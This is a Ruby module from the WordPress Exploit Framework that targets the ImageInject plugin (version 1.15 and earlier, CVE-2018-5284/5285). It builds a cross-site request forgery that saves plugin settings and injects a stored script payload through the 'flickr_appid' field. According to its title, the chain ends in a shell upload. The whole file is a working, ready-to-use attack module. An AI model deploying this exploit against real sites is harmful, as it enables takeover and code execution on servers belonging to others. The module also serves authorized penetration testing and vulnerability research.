# frozen_string_literal: true

class Wpxf::Exploit::ImageInjectCsrfStoredXssShellUpload < Wpxf::Module
  include Wpxf::WordPress::StagedReflectedXss

  def initialize
    super

    update_info(
      name: 'ImageInject <= 1.15 CSRF Stored XSS Shell Upload',
      author: [
        'd4wner',   # Disclosure
        'rastating' # WPXF module
      ],
      references: [
        ['WPVDB', '8994'],
        ['CVE', '2018-5284'],
        ['CVE', '2018-5285']
      ],
      date: 'Jan 04 2018'
    )
  end

  def check
    check_plugin_version_from_readme('wp-inject', '1.16')
  end

  def vulnerable_url
    "#{normalize_uri(wordpress_url_admin, 'options-general.php')}?page=wpdf-options"
  end

  def initial_script
    create_basic_post_script(
      vulnerable_url,
      'save_options' => 'Save All Settings',
      'flickr_enabled' => '1',
      'flickr_appid' => "251f306e19c56bb3c8a2a9b2bd7a076a\\\"><script>#{xss_ascii_encoded_include_script}<\\/script>",
      'flickr_license' => '4,5,6,7',
      'flickr_sort' => 'relevance',
      'pixabay_enabled' => '1',
      'pixabay_image_type' => 'all',
      'general_save_images' => '1',
      'general_feat_img_size' => 'medium',
      'general_default_align' => 'none',
      'general_attr_location' => 'caption',
      'general_items_per_req' => '40',
      'advanced_img_template' => '<img title=\"{title} by {author}\" alt=\"{keyword} photo\" src=\"{src}\" />',
      'advanced_attr_template' => '<small>Photo by <a href=\"{link}\" target=\"_blank\">{author}</a> {cc_icon}</small>',
      'advanced_attr_template_multi' => '<small>Photos by {linklist}</small>',
      'advanced_filename_template' => '{filename}_{keyword}'
    )
  end
end
